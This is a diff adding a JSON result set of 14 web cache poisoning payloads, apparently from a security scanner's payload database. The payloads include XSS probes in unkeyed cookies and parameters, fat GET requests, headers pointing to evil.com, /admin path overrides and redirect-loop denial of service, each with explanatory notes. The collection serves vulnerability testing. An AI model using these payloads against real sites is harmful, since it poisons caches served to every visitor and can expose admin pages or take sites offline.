@@ -1,0 +1,262 @@
+{
+  "query": {
+    "limit": 20,
+    "max_risk": 3,
+    "vuln_type": "cache_poisoning"
+  },
+  "count": 14,
+  "results": [
+    {
+      "id": "1c9aff740cdc0b77",
+      "payload": "Cookie: region=evil-region\"\u003e\u003cscript\u003ealert(1)\u003c/script\u003e",
+      "technique": "unkeyed_cookie",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Unkeyed region cookie. If a region/locale cookie is reflected in the HTML (e.g., in a dropdown or banner) and the cache does not key on it, the XSS payload persists in the cached response.",
+      "source": "ensphere",
+      "tags": [
+        "breakout",
+        "cookie",
+        "region",
+        "xss"
+      ]
+    },
+    {
+      "id": "3c081c5f6b34325c",
+      "payload": "X-Original-URL: /admin",
+      "technique": "unkeyed_header",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "response_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "X-Original-URL cache poisoning. Some web servers (IIS, Nginx) use this header to override the request path. If the cache keys on the visible URL but the back-end serves content for /admin, the admin page is cached at the public URL.",
+      "source": "ensphere",
+      "tags": [
+        "iis",
+        "path_override",
+        "x_original_url"
+      ]
+    },
+    {
+      "id": "40a9e023008e1533",
+      "payload": "X-Host: evil.com",
+      "technique": "unkeyed_header",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "X-Host header poisoning. Alternative to X-Forwarded-Host used by some application frameworks. If the app generates URLs from X-Host and the cache ignores it, responses with attacker-controlled URLs are cached.",
+      "source": "ensphere",
+      "tags": [
+        "forwarded",
+        "url_generation",
+        "x_host"
+      ]
+    },
+    {
+      "id": "4bf30cbfe1fae2a0",
+      "payload": "X-Forwarded-Proto: http",
+      "technique": "unkeyed_header",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "redirect",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "X-Forwarded-Proto redirect poisoning. Similar to X-Forwarded-Scheme. If the app sees proto=http and issues a redirect to https://, that redirect is cached and served to all subsequent visitors.",
+      "source": "ensphere",
+      "tags": [
+        "dos",
+        "proto",
+        "redirect",
+        "xfp"
+      ]
+    },
+    {
+      "id": "50b6233e1f9acb77",
+      "payload": "X-Forwarded-For: evil.com",
+      "technique": "unkeyed_header",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "X-Forwarded-For in cached response. If the application reflects X-Forwarded-For in the page (e.g., debug info, logging panels, IP-based content), and the cache does not key on it, all users see the attacker's value.",
+      "source": "ensphere",
+      "tags": [
+        "debug",
+        "reflection",
+        "xff"
+      ]
+    },
+    {
+      "id": "67fb86a40de39ad8",
+      "payload": "X-Forwarded-Scheme: http",
+      "technique": "unkeyed_header",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "redirect",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "X-Forwarded-Scheme redirect poisoning. If the application forces HTTPS by checking X-Forwarded-Scheme, injecting 'http' causes a 301/302 redirect to the HTTPS version. If cached, all users receive the redirect loop, causing denial of service.",
+      "source": "ensphere",
+      "tags": [
+        "dos",
+        "redirect",
+        "scheme",
+        "xfs"
+      ]
+    },
+    {
+      "id": "7b327673e7da4a7d",
+      "payload": "GET /search?q=normal HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 31\r\n\r\nq=\u003cscript\u003ealert(1)\u003c/script\u003e",
+      "technique": "fat_get",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [
+        "TARGET"
+      ],
+      "notes": "Fat GET parameter override. If the back-end prioritizes body parameters over query parameters, the body value of 'q' overrides the URL value. The cache keys on ?q=normal, but the response contains the XSS from the body.",
+      "source": "ensphere",
+      "tags": [
+        "fat_get",
+        "param_override",
+        "query_body_conflict",
+        "xss"
+      ]
+    },
+    {
+      "id": "88ff02e4876990bd",
+      "payload": "X-Forwarded-Prefix: /evil",
+      "technique": "unkeyed_header",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "X-Forwarded-Prefix poisoning. If the application prepends X-Forwarded-Prefix to URL paths (common in Spring Boot behind a reverse proxy), cached responses contain corrupted links pointing to attacker-controlled path prefixes.",
+      "source": "ensphere",
+      "tags": [
+        "prefix",
+        "spring",
+        "url_generation",
+        "xfp"
+      ]
+    },
+    {
+      "id": "90f02dcb56438f20",
+      "payload": "cb=\u003cscript\u003ealert(1)\u003c/script\u003e",
+      "technique": "unkeyed_header",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Unkeyed cache-buster parameter. Parameters like 'cb', '_', 'cachebust', or 'nocache' are often stripped from the cache key. If reflected in the response, the XSS payload is served from cache.",
+      "source": "ensphere",
+      "tags": [
+        "cachebuster",
+        "reflection",
+        "unkeyed_param",
+        "xss"
+      ]
+    },
+    {
+      "id": "9ac7d0892ef5655a",
+      "payload": "utm_content=\u003cscript\u003ealert(1)\u003c/script\u003e",
+      "technique": "unkeyed_header",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Unkeyed query parameter (UTM). Many CDNs strip or ignore UTM parameters from the cache key to improve hit rates. If the application reflects utm_content in the page, the XSS is cached and served to all visitors of the same URL without UTM params.",
+      "source": "ensphere",
+      "tags": [
+        "cdn",
+        "unkeyed_param",
+        "utm",
+        "xss"
+      ]
+    },
+    {
+      "id": "b8675525f1d373b5",
+      "payload": "Cookie: language=\u003cscript\u003ealert(1)\u003c/script\u003e",
+      "technique": "unkeyed_cookie",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Unkeyed cookie cache poisoning. If the cache does not key on cookies but the application uses a cookie value (e.g., language preference) to render page content, the XSS payload is served to all users from cache.",
+      "source": "ensphere",
+      "tags": [
+        "cookie",
+        "language",
+        "reflection",
+        "xss"
+      ]
+    },
+    {
+      "id": "cdcdd9ebdd12cd98",
+      "payload": "GET /api/endpoint HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 19\r\n\r\nparam=evil_value",
+      "technique": "fat_get",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "response_diff",
+      "risk": 3,
+      "placeholders": [
+        "TARGET"
+      ],
+      "notes": "Fat GET cache poisoning. Some frameworks (e.g., Flask, Express) parse the body of a GET request. The cache keys on the URL and query string only, ignoring the body. If the app uses the body param to render content, the poisoned response is served from cache to all users.",
+      "source": "ensphere",
+      "tags": [
+        "body",
+        "fat_get",
+        "framework",
+        "get_request"
+      ]
+    },
+    {
+      "id": "cecc1d04634d1874",
+      "payload": "X-Forwarded-Host: evil.com",
+      "technique": "unkeyed_header",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "X-Forwarded-Host cache poisoning. If the cache does not include X-Forwarded-Host in its key but the application uses it to generate URLs (e.g., in script src, link href, or redirect targets), the cached response serves attacker-controlled URLs to all users.",
+      "source": "ensphere",
+      "tags": [
+        "forwarded_host",
+        "url_generation",
+        "xfh"
+      ]
+    },
+    {
+      "id": "f461afa9b4cd0408",
+      "payload": "X-Rewrite-URL: /admin",
+      "technique": "unkeyed_header",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "response_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "X-Rewrite-URL cache poisoning. Similar to X-Original-URL but used by IIS URL Rewrite module. The back-end processes /admin while the cache stores the response under the original benign URL.",
+      "source": "ensphere",
+      "tags": [
+        "iis",
+        "path_override",
+        "rewrite",
+        "x_rewrite_url"
+      ]
+    }
+  ]
+}
